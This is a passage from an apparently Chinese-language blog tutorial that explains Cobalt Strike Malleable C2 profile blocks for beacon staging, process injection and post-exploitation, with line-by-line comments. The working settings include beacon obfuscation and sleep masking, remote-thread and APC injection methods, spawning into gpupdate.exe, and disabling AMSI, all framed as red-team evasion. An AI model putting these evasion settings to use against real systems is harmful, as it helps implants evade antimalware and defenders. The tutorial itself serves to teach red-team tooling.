<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">###Malleable PE/Stage Block###</span><br><span class="line">stage &#123;</span><br><span class="line">    set checksum        &quot;0&quot;;  //PE头里checksum的值</span><br><span class="line">    set compile_time    &quot;23 Nov 2018 02:25:37&quot;; //beacon pe头中显示的编译的时间</span><br><span class="line">    set entry_point     &quot;170000&quot;; //beacon pe头中设置的入口点</span><br><span class="line">    #set image_size_x86 &quot;6586368&quot;;  //x86 PE头里写的镜像大小</span><br><span class="line">    #set image_size_x64 &quot;6586368&quot;;  //x64 PE头里写的镜像大小</span><br><span class="line">    #set name	        &quot;WWanMM.dll&quot;;   //	beacon dll 导出的名字</span><br><span class="line">    set userwx 	        &quot;false&quot;;    //反射加载时是否要把内存设置为可读可写可执行</span><br><span class="line">    set cleanup	        &quot;true&quot;;  //如果选择是则尝试释放反射加载的dll的内存</span><br><span class="line">    set sleep_mask	&quot;true&quot;;  //是否在sleep前在内存中混淆beacon</span><br><span class="line">    set stomppe	        &quot;true&quot;; //</span><br><span class="line">    set obfuscate	&quot;true&quot;;  //是否混淆反射调用dll的导入表，覆盖无用的header内容，请求反射加载器copy beacon到新的内存没有dll头</span><br><span class="line">    set rich_header     &quot;&quot;;  //编译器插入的元信息</span><br><span class="line">    </span><br><span class="line">    set sleep_mask &quot;true&quot;;  //是否在sleep前在内存中混淆beacon</span><br><span class="line"></span><br><span class="line">    set module_x86 &quot;wwanmm.dll&quot;;  //加载一个dll，然后用beacon去覆盖它分配的空间，而不是用VirtualAlloc去分配内存</span><br><span class="line">    set module_x64 &quot;wwanmm.dll&quot;;</span><br><span class="line"></span><br><span class="line">    transform-x86 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;  // 在beacon 反射调用dll之前插入一些数据</span><br><span class="line">        strrep &quot;ReflectiveLoader&quot; &quot;&quot;; </span><br><span class="line">        strrep &quot;beacon.dll&quot; &quot;&quot;;   //  查找并替换字符串</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">        strrep &quot;ReflectiveLoader&quot; &quot;&quot;;</span><br><span class="line">        strrep &quot;beacon.x64.dll&quot; &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    #string &quot;something&quot;;   //添加字符串</span><br><span class="line">    #data &quot;something&quot;;</span><br><span class="line">    #stringw &quot;something&quot;;   //添加UTF-16字符串</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        在看看进程注入的部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">###Process Inject Block###</span><br><span class="line">process-inject &#123;</span><br><span class="line"></span><br><span class="line">    set allocator &quot;NtMapViewOfSection&quot;;	//在远程进程中分配内存的方式，有两种方式VirtualAllocEx和NtMapViewOfSection，VirtualAlloc是Windows提供的API，通常用来分配大块的内存。例如如果想在进程A和进程B之间通过共享内存的方式实现通信，可以使用该函数（这也是较常用的情况）。利用NtMapViewOfSection在远程进程地址空间写入代码，并且用一种新的技术在远程进程中执行它，这种技术完全工作在用户模式下，并且不需要特殊的条件比如像管理员权限或者之类的要求</span><br><span class="line">    set min_alloc &quot;16700&quot;;  //最小的分配内存的大小</span><br><span class="line"></span><br><span class="line">    set userwx &quot;false&quot;;  ////是否使用rwx作为代码内存的默认权限，默认rx</span><br><span class="line">    </span><br><span class="line">    set startrwx &quot;false&quot;;  //是否使用rwx作为代码内存的默认权限,默认rx</span><br><span class="line">        </span><br><span class="line">    transform-x86 &#123;  </span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execute &#123;</span><br><span class="line">        CreateThread &quot;ntdll!RtlUserThreadStart&quot;;    //进程可以在其他的进程中创建一个线程 </span><br><span class="line">        CreateThread; </span><br><span class="line">        NtQueueApcThread;  //通过NtQueueApcThread实现APC注入</span><br><span class="line">        CreateRemoteThread;</span><br><span class="line">        RtlCreateUserThread;  //创建远程线程的一种技术</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        我们再来看看post-ex块，这个模块用来控制后渗透的行为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">###Post-Ex Block###</span><br><span class="line">post-ex &#123;</span><br><span class="line"></span><br><span class="line">    set spawnto_x86 &quot;%windir%\\syswow64\\gpupdate.exe&quot;;  //派生后渗透功能的默认临时进程</span><br><span class="line">    set spawnto_x64 &quot;%windir%\\sysnative\\gpupdate.exe&quot;;</span><br><span class="line"></span><br><span class="line">    set obfuscate &quot;true&quot;;  //对dll的内容进行加密，并且将post-ex功能建立到内存中，</span><br><span class="line"></span><br><span class="line">    set smartinject &quot;true&quot;; //提示beacon将关键的函数指针嵌入到相同架构的post-ex dll中</span><br><span class="line"> </span><br><span class="line">    set amsi_disable &quot;true&quot;;  //关闭amsi,AMSI（Antimalware Scan Interface）， 即反恶意软件扫描接口。在Windows Server 2016和Win10上默认安装并启用。</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​            通过上面的学习，大家应该了解了关于Malleable C2 Profile文件编写的基本的方法，可以根据自己的需要编写自己的Malleable C2 Profile文件，当然我们得知道编写profile文件的目的是为了尽量去模拟正常的网站访问流量。</p>
<p><strong>参考文章</strong></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/bugbountywriteup/red-team-cobalt-strike-4-0-malleable-c2-profile-guideline-eb3eeb219a7c">[RED_TEAM] Cobalt Strike 4.0+ Malleable C2 Profile Guideline</a></p>
<p>CobaltStrike4.0用户手册_中文翻译</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/cobaltstrike/">cobaltstrike</a>
    </span>
    

    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2022 藏青
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>